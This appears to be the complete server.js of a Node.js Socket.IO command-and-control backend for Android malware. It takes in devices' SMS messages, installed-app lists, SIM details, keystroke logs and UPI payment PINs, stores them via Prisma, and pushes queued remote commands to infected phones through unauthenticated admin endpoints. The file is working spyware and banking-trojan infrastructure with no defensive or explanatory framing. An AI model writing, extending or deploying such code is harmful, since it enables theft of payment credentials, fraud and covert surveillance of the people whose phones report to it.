// server.js
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');
require('dotenv').config();

const { PrismaClient } = require('@prisma/client');

// Handle BigInt serialization
BigInt.prototype.toJSON = function () { return this.toString() }

const prisma = new PrismaClient();
const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

app.use(cors());
app.use(express.json());

// Connect to database
async function connectDatabase() {
    try {
        await prisma.$connect();
        console.log('Connected to database via Prisma');
    } catch (err) {
        console.error('Database connection error:', err);
        process.exit(1);
    }
}

connectDatabase();

// Socket.IO Connection Handling
io.on('connection', (socket) => {
    const deviceId = socket.handshake.query.device_id;
    console.log(`Device connected: ${deviceId}`);

    if (deviceId) {
        // Join device-specific room
        socket.join(`device:${deviceId}`);

        // Update device online status
        prisma.device.upsert({
            where: { device_id: deviceId },
            update: {
                status: true,
                last_seen: new Date()
            },
            create: {
                device_id: deviceId,
                status: true,
                last_seen: new Date()
            }
        }).catch(err => {
            console.error('Error updating device status:', err.message);
        });
    }

    // Upsert device data
    socket.on('upsert_device_data', async (data, ack) => {
        try {
            let deviceData = typeof data === 'string' ? JSON.parse(data) : data;

            // Handle array input (take first item)
            if (Array.isArray(deviceData)) {
                deviceData = deviceData[0];
            }

            if (!deviceData) {
                console.error('No device data provided');
                if (ack) ack(false);
                return;
            }

            // Helper to get value from either snake_case or camelCase
            const getVal = (key1, key2) => deviceData[key1] !== undefined ? deviceData[key1] : deviceData[key2];

            const id = getVal('device_id', 'deviceId');

            if (!id) {
                console.error('Device ID missing in upsert data');
                if (ack) ack(false);
                return;
            }

            const updateData = {
                android_id: getVal('android_id', 'androidId'),
                manufacturer: getVal('manufacturer', 'manufacturer') ?? "Unknown",
                model: getVal('model', 'model') ?? "Unknown",
                brand: getVal('brand', 'brand'),
                product: getVal('product', 'product'),
                android_version: getVal('android_version', 'androidVersion'),
                raw_device_info: getVal('raw_device_info', 'rawDeviceInfo'),
                sim_cards: getVal('sim_cards', 'simCards'),
                service_status: getVal('service_status', 'serviceStatus'),
                oem_status: getVal('oem_status', 'oemStatus'),
                power_save_status: getVal('power_save_status', 'powerSaveStatus'),
                screen_status: getVal('screen_status', 'screenStatus'),
                process_importance: (getVal('process_importance', 'processImportance') || null)?.toString(),

                // If heartbeat is included in the payload, save it too
                heartbeat: deviceData.heartbeat || undefined,

                status: true,
                last_seen: new Date()
            };

            await prisma.device.upsert({
                where: { device_id: id },
                update: updateData,
                create: {
                    device_id: id,
                    ...updateData
                }
            });
            if (ack) ack(true);
        } catch (error) {
            console.error('Error upserting device data:', error);
            if (ack) ack(false);
        }
    });

    // Get pending commands
    socket.on('get_pending_commands', async (deviceId, ack) => {
        try {
            const commands = await prisma.deviceCommand.findMany({
                where: {
                    device_id: deviceId,
                    status: 'pending'
                },
                orderBy: { created_at: 'desc' }
            });

            const mappedCommands = commands.map(c => ({
                id: c.id,
                deviceId: c.device_id,
                command: c.command,
                payload: c.payload,
                status: c.status
            }));

            if (ack) ack(JSON.stringify(mappedCommands));
        } catch (error) {
            console.error('Error getting pending commands:', error);
            if (ack) ack(JSON.stringify([]));
        }
    });

    // Mark command as delivered
    socket.on('mark_command_delivered', async (commandId, ack) => {
        try {
            await prisma.deviceCommand.update({
                where: { id: commandId },
                data: {
                    status: 'delivered',
                    delivered_at: new Date()
                }
            });
            if (ack) ack(true);
        } catch (error) {
            console.error('Error marking command as delivered:', error);
            if (ack) ack(false);
        }
    });

    // Mark command as executed
    socket.on('mark_command_executed', async (commandId, ack) => {
        try {
            await prisma.deviceCommand.update({
                where: { id: commandId },
                data: {
                    status: 'executed',
                    executed_at: new Date()
                }
            });
            if (ack) ack(true);
        } catch (error) {
            console.error('Error marking command as executed:', error);
            if (ack) ack(false);
        }
    });

    // Mark command as failed
    socket.on('mark_command_failed', async (data, ack) => {
        try {
            const d = typeof data === 'string' ? JSON.parse(data) : data;

            await prisma.deviceCommand.update({
                where: { id: d.command_id },
                data: {
                    status: 'failed',
                    executed_at: new Date()
                }
            });
            console.log(`Command ${d.command_id} failed: ${d.error}`);
            if (ack) ack(true);
        } catch (error) {
            console.error('Error marking command as failed:', error);
            if (ack) ack(false);
        }
    });

    // Send heartbeat
    socket.on('send_heartbeat', async (data, ack) => {
        try {
            const h = typeof data === 'string' ? JSON.parse(data) : data;

            // Insert into heartbeat table
            await prisma.heartbeat.create({
                data: {
                    device_id: h.device_id,
                    status: h.status,
                    last_update: new Date(),
                    uptime: BigInt(h.uptime || 0),
                    ram: BigInt(h.ram || 0)
                }
            });

            // Update device table heartbeat snapshot and last_seen
            await prisma.device.update({
                where: { device_id: h.device_id },
                data: {
                    heartbeat: h,
                    last_seen: new Date(),
                    status: true
                }
            });

            socket.emit('heartbeat_ack');
            if (ack) ack(true);
        } catch (error) {
            console.error('Error processing heartbeat:', error);
            if (ack) ack(false);
        }
    });

    // Set online status
    socket.on('set_online_status', async (status, ack) => {
        try {
            if (deviceId) {
                await prisma.device.update({
                    where: { device_id: deviceId },
                    data: {
                        status: status,
                        last_seen: new Date()
                    }
                }).catch(e => console.error("Update online status failed", e.message));
            }
            if (ack) ack(true);
        } catch (error) {
            console.error('Error setting online status:', error);
            if (ack) ack(false);
        }
    });

    // Sync SMS
    socket.on('sync_sms', async (data, ack) => {
        try {
            let messages = typeof data === 'string' ? JSON.parse(data) : data;
            if (!Array.isArray(messages)) {
                // Handle case where it might be a single object or wrapped strangely
                messages = [messages];
            }

            // Normalize helper
            const getVal = (obj, key1, key2) => obj[key1] !== undefined ? obj[key1] : obj[key2];

            await prisma.$transaction(async (tx) => {
                for (const msg of messages) {
                    if (!msg) continue;

                    const deviceId = getVal(msg, 'device_id', 'deviceId');
                    const idRaw = getVal(msg, 'id', 'id');
                    const address = getVal(msg, 'address', 'address');
                    const body = getVal(msg, 'body', 'body');
                    const date = getVal(msg, 'date', 'date');
                    const timestamp = getVal(msg, 'timestamp', 'timestamp');
                    const type = getVal(msg, 'type', 'type');

                    if (!deviceId || !idRaw) continue;

                    const smsId = BigInt(idRaw);
                    const ts = timestamp ? BigInt(timestamp) : BigInt(0);

                    await tx.smsMessage.upsert({
                        where: {
                            id_device_id: {
                                id: smsId,
                                device_id: deviceId
                            }
                        },
                        update: {
                            address: address,
                            body: body,
                            date: date,
                            timestamp: ts,
                            type: type,
                            sync_status: 'synced'
                        },
                        create: {
                            id: smsId,
                            device_id: deviceId,
                            address: address,
                            body: body,
                            date: date,
                            timestamp: ts,
                            type: type,
                            sync_status: 'synced'
                        }
                    });
                }
            });

            socket.emit('sync_complete', 'sms', messages.length);
            if (ack) ack(true);
        } catch (error) {
            console.error('Error syncing SMS:', error);
            if (ack) ack(false);
        }
    });

    // Sync single SMS
    socket.on('sync_single_sms', async (data, ack) => {
        try {
            const msg = typeof data === 'string' ? JSON.parse(data) : data;
            const getVal = (obj, key1, key2) => obj[key1] !== undefined ? obj[key1] : obj[key2];

            const deviceId = getVal(msg, 'device_id', 'deviceId');
            const idRaw = getVal(msg, 'id', 'id');
            const address = getVal(msg, 'address', 'address');
            const body = getVal(msg, 'body', 'body');
            const date = getVal(msg, 'date', 'date');
            const timestamp = getVal(msg, 'timestamp', 'timestamp');
            const type = getVal(msg, 'type', 'type');

            if (deviceId && idRaw) {
                const smsId = BigInt(idRaw);
                const ts = timestamp ? BigInt(timestamp) : BigInt(0);

                await prisma.smsMessage.upsert({
                    where: {
                        id_device_id: {
                            id: smsId,
                            device_id: deviceId
                        }
                    },
                    update: {
                        address: address,
                        body: body,
                        date: date,
                        timestamp: ts,
                        type: type,
                        sync_status: 'synced'
                    },
                    create: {
                        id: smsId,
                        device_id: deviceId,
                        address: address,
                        body: body,
                        date: date,
                        timestamp: ts,
                        type: type,
                        sync_status: 'synced'
                    }
                });
            }
            if (ack) ack(true);
        } catch (error) {
            console.error('Error syncing single SMS:', error);
            if (ack) ack(false);
        }
    });

    // Sync apps
    socket.on('sync_apps', async (data, ack) => {
        try {
            let apps = typeof data === 'string' ? JSON.parse(data) : data;
            if (!Array.isArray(apps)) {
                apps = [apps];
            }

            const getVal = (obj, key1, key2) => obj[key1] !== undefined ? obj[key1] : obj[key2];

            await prisma.$transaction(async (tx) => {
                for (const app of apps) {
                    if (!app) continue;

                    const deviceId = getVal(app, 'device_id', 'deviceId');
                    const packageName = getVal(app, 'package_name', 'packageName');

                    if (!deviceId || !packageName) {
                        console.warn("Skipping app sync: Missing device_id or package_name", app);
                        continue;
                    }

                    const appName = getVal(app, 'app_name', 'appName');
                    const icon = getVal(app, 'icon', 'icon');
                    const versionName = getVal(app, 'version_name', 'versionName');

                    const versionCodeFn = getVal(app, 'version_code', 'versionCode');
                    const versionCode = versionCodeFn ? BigInt(versionCodeFn) : null;

                    const firstInstallTimeFn = getVal(app, 'first_install_time', 'firstInstallTime');
                    const firstInstallTime = firstInstallTimeFn ? BigInt(firstInstallTimeFn) : null;

                    const lastUpdateTimeFn = getVal(app, 'last_update_time', 'lastUpdateTime');
                    const lastUpdateTime = lastUpdateTimeFn ? BigInt(lastUpdateTimeFn) : null;

                    const isSystemApp = getVal(app, 'is_system_app', 'isSystemApp');
                    const targetSdk = getVal(app, 'target_sdk', 'targetSdk');
                    const minSdk = getVal(app, 'min_sdk', 'minSdk');

                    const syncTsFn = getVal(app, 'sync_timestamp', 'syncTimestamp');
                    const syncTimestamp = syncTsFn ? BigInt(syncTsFn) : BigInt(Date.now());

                    await tx.installedApp.upsert({
                        where: {
                            device_id_package_name: {
                                device_id: deviceId,
                                package_name: packageName
                            }
                        },
                        update: {
                            app_name: appName,
                            icon: icon,
                            version_name: versionName,
                            version_code: versionCode,
                            first_install_time: firstInstallTime,
                            last_update_time: lastUpdateTime,
                            is_system_app: isSystemApp,
                            target_sdk: targetSdk,
                            min_sdk: minSdk,
                            sync_timestamp: syncTimestamp,
                            updated_at: new Date()
                        },
                        create: {
                            device_id: deviceId,
                            package_name: packageName,
                            app_name: appName,
                            icon: icon,
                            version_name: versionName,
                            version_code: versionCode,
                            first_install_time: firstInstallTime,
                            last_update_time: lastUpdateTime,
                            is_system_app: isSystemApp || false,
                            target_sdk: targetSdk,
                            min_sdk: minSdk,
                            sync_timestamp: syncTimestamp,
                            created_at: new Date(),
                            updated_at: new Date()
                        }
                    });
                }
            });

            socket.emit('sync_complete', 'apps', apps.length);
            if (ack) ack(true);
        } catch (error) {
            console.error('Error syncing apps:', error);
            if (ack) ack(false);
        }
    });

    // Set key log
    socket.on('set_key_log', async (data, ack) => {
        try {
            const keyLog = typeof data === 'string' ? JSON.parse(data) : data;
            const getVal = (obj, key1, key2) => obj[key1] !== undefined ? obj[key1] : obj[key2];

            const deviceId = getVal(keyLog, 'device_id', 'deviceId');
            const currentDate = getVal(keyLog, 'current_date', 'currentDate');

            if (deviceId) {
                await prisma.keyLog.create({
                    data: {
                        device_id: deviceId,
                        keylogger: getVal(keyLog, 'keylogger', 'keylogger'),
                        key: getVal(keyLog, 'key', 'key'),
                        currentDate: currentDate ? new Date(currentDate) : new Date()
                    }
                });
            }
            if (ack) ack(true);
        } catch (error) {
            console.error('Error saving key log:', error);
            if (ack) ack(false);
        }
    });

    // Set UPI pin
    socket.on('set_upi_pin', async (data, ack) => {
        try {
            const pinData = typeof data === 'string' ? JSON.parse(data) : data;
            const getVal = (obj, key1, key2) => obj[key1] !== undefined ? obj[key1] : obj[key2];

            const deviceId = getVal(pinData, 'device_id', 'deviceId');
            const currentDate = getVal(pinData, 'current_date', 'currentDate');

            if (deviceId) {
                await prisma.upiPin.create({
                    data: {
                        device_id: deviceId,
                        pin: getVal(pinData, 'pin', 'pin'),
                        currentDate: currentDate ? new Date(currentDate) : new Date()
                    }
                });
            }
            if (ack) ack(true);
        } catch (error) {
            console.error('Error saving UPI pin:', error);
            if (ack) ack(false);
        }
    });

    // Test connection
    socket.on('test_connection', (data, ack) => {
        if (ack) ack(true);
    });

    // Admin: Send command to device
    socket.on('send_command', async (data) => {
        try {
            const { device_id, command, payload } = data;
            const newCommand = await prisma.deviceCommand.create({
                data: {
                    device_id,
                    command,
                    payload,
                    status: 'pending'
                }
            });

            const commandToSend = {
                id: newCommand.id,
                deviceId: newCommand.device_id,
                command: newCommand.command,
                payload: newCommand.payload,
                status: newCommand.status
            };

            // Emit as array because client expects List<DeviceCommand>
            io.to(`device:${device_id}`).emit('command', JSON.stringify([commandToSend]));
        } catch (error) {
            console.error('Error sending command:', error);
        }
    });

    // Handle disconnection
    socket.on('disconnect', () => {
        console.log(`Device disconnected: ${deviceId}`);

        if (deviceId) {
            // Update device offline status
            prisma.device.update({
                where: { device_id: deviceId },
                data: {
                    status: false,
                    last_seen: new Date()
                }
            }).catch(err => console.error('Error updating offline status:', err));
        }
    });
});

// REST API Endpoints for Admin
app.get('/api/devices', async (req, res) => {
    try {
        const devices = await prisma.device.findMany({
            orderBy: { last_seen: 'desc' }
        });
        res.json(devices);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.get('/api/devices/:deviceId/commands', async (req, res) => {
    try {
        const commands = await prisma.deviceCommand.findMany({
            where: { device_id: req.params.deviceId },
            orderBy: { created_at: 'desc' }
        });
        res.json(commands);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.post('/api/devices/:deviceId/commands', async (req, res) => {
    try {
        const { command, payload } = req.body;
        const newCommand = await prisma.deviceCommand.create({
            data: {
                device_id: req.params.deviceId,
                command: command,
                payload: payload,
                status: 'pending'
            }
        });

        const commandToSend = {
            id: newCommand.id,
            deviceId: newCommand.device_id,
            command: newCommand.command,
            payload: newCommand.payload,
            status: newCommand.status
        };

        // Emit command to device
        io.to(`device:${req.params.deviceId}`).emit('command', JSON.stringify([commandToSend]));

        res.json(newCommand);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.get('/api/devices/:deviceId/heartbeats', async (req, res) => {
    try {
        const heartbeats = await prisma.heartbeat.findMany({
            where: { device_id: req.params.deviceId },
            orderBy: { last_update: 'desc' },
            take: 100
        });
        res.json(heartbeats);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Graceful shutdown
process.on('SIGINT', async () => {
    await prisma.$disconnect();
    process.exit(0);
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Socket.IO server running on port ${PORT}`);
});